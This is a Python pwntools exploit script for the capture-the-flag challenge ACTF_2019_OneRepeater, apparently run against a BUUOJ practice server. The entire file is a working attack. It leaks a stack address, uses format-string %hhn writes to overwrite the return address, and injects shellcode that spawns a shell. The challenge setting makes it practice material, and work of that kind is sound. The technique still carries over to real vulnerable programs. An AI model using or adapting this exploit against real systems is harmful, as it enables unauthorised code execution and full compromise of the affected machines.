from pwn import *

context(os = 'linux', arch = 'i386', log_level = 'debug')
# io = process('ACTF_2019_OneRepeater')
io = remote('node4.buuoj.cn', 25202)
# libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
# libc = ELF('libc-2.27.so')
elf = ELF('ACTF_2019_OneRepeater')

shellcode = asm(shellcraft.sh())

io.sendlineafter('3) Exit\n', '1')
stack_addr = int(io.recvline()[:-1], 16)
log.success('stack_addr: ' + hex(stack_addr))
ret_addr = stack_addr - 0x24
payload = shellcode
for i in range(4):
    payload += p32(ret_addr + i)
cur_num = len(payload)
for i in range(4):
    target_num = (stack_addr >> (i * 8)) & 0xff
    if target_num > cur_num:
        payload += b'%' + str.encode(str(target_num - cur_num)) + b'c'
    else:
        payload += b'%' + str.encode(str(0x100 + target_num - cur_num)) + b'c'
    payload += b'%' + str.encode(str(27 + i)) + b'$hhn'
    cur_num = target_num
io.sendline(payload)

io.sendlineafter('3) Exit\n', '2')
io.interactive()
